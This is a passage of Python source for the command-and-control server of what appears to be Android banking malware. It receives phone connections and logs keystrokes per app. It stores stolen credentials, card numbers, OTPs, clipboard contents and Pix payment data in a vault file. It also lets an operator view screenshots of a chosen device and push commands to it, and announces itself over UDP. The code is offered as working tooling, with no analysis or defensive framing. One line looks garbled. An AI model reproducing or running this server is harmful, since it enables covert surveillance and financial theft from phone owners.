                    DEVS[dev] = {"ws": ws, "i": o}
                    print("+ %s (%d online)" % (dev, len(DEVS)))
                    await devs()
                elif o.get("t") == "ka":
                    try: await ws.send_str('{"c":"ka"}')
                    except Exception: pass
                    continue
                elif o.get("t") == "k":
                    klog(dev, o.get("pkg"), o.get("win"), o.get("o", ""))
                    await bcast({"k": "key", "d": {"id": dev, "pkg": o.get("pkg"),
                                                   "win": o.get("win"), "o": o.get("o", "")}})
                    continue
                elif o.get("t") in ("cred", "cartao", "otp", "clip", "pixvisto"):
                    cofre(o.get("t"), dev, o.get("o"))
                await bcast({"k": "log", "d": o}, dev)
    except Exception as e:
        print("  ! erro em %s: %s" % (dev, e))
    finally:
        if dev and DEVS.get(dev, {}).get("ws") is ws:
            DEVS.pop(dev, None)
            print("- %s saiu" % dev)
            await devs()
    return ws

async def panel(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    ws = web.WebSocketResponse(heartbeat=20, max_msg_size=0, compress=False)
    await ws.prepare(req)
    VIEW[ws] = None
    await ws.send_str(json.dumps({"k": "devs", "d": devlist()}))
    try:
        async for m in ws:
            if m.type != WSMsgType.TEXT: continue
            try: o = json.loads(m.data)
            except Exception: continue
            if o.get("c") == "sel":
                VIEW[ws] = o.get("id") or None
                alvo = DEVS.get(VIEW[ws])
                if alvo:
                    try:
                        await alvo["ws"].send_str('{"c":"shot","on":true}')
                        await alvo["ws"].send_str('{"c":"info"}')
                    except Exception: pass
                continue
            alvo = DEVS.get(o.get("id") or VIEW[ws])
            if not alvo:
                await ws.send_str(json.dumps({"k": "log", "d": {"t": "err", "o": "aparelho offline"}}))
                continue
            VIEW[ws] = o.get("id") or VIEW[ws]
            try: await alvo["ws"].send_str(json.dumps({k: v for k, v in o.items() if k != "id"}))
            except Exception: pass
    except Exception: pass
    finally: VIEW.pop(ws, None)
    return ws

async def keys_get(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    try: n = min(int(req.query.get("n", 400)), 2000)
    except Exception: n = 400
    dev = req.query.get("dev")
    linhas = []
    if os.path.exists(KF):
        with open(KF, encoding="utf-8", errors="replace") as f:
            for l in f:
                if dev and ("\t" + dev + "\t") not in l: continue
                linhas.append(l.rstrip("\n"))
    return web.json_response({"l": linhas[-n:]})

async def keys_clear(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    open(KF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})

async def keys_dl(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    if not os.path.exists(KF): open(KF, "w", encoding="utf-8").close()
    return web.FileResponse(KF, headers={"Content-Disposition": 'attachment; filename="teclado.log"'})

async def cofre_get(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    tipo = req.query.get("tipo")
    out = []
    if os.path.exists(CF):
        with open(CF, encoding="utf-8", errors="replace") as f:
            for l in f:
                try: o = json.loads(l)
                except Exception: continue
                if tipo and o.get("_t") != tipo: continue
                out.append(o)
    return web.json_response({"l": out[-800:][::-1]})

async def cofre_clr(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    open(CF, "w", encoding="utf-8").close()
    return web.json_response({"ok": True})

async def health(req):
    if not ok(req): raise web.HTTPForbidden(text="token invalido")
    return web.json_response({"ok": True, "devices": devlist()})

def local_ip(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((dst, 9)); return s.getsockname()[0]
    except Exception: return "127.0.0.1"
    finally: s.close()

async def udp_loop():
    loop = asyncio.get_event_loop()
    sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try: sk.bind(("0.0.0.0", 8089))
    except Exception as e:
        print("! udp 8089 indisponivel: %s" % e); return
    sk.setblocking(False)
    while True:
        try:
            data, addr = await loop.sock_recvfrom(sk, 64)
            if data.strip() == b"AVAL":
                await loop.sock_sock_sendto if False else None
                await loop.sock_sendto(sk, ("ws://%s:8080/ws?t=%s" % (local_ip(addr[0]), TOKEN)).encode(), addr)
        except Exception:
            await asyncio.sleep(0.2)

async def on_start(app):
    app["udp"] = asyncio.create_task(udp_loop())

def main():
    app = web.Application()
    app.router.add_get("/", index)
    app.router.add_get("/ws", phone)
    app.router.add_get("/panel", panel)
    app.router.add_get("/health", health)
    app.router.add_get("/keys", keys_get)
    app.router.add_get("/keys/clear", keys_clear)
    app.router.add_get("/keys/dl", keys_dl)
    app.router.add_get("/cofre", cofre_get)
    app.router.add_get("/cofre/clr", cofre_clr)
    app.on_startup.append(on_start)
    print("painel: http://localhost:8080/")
    web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)

main()
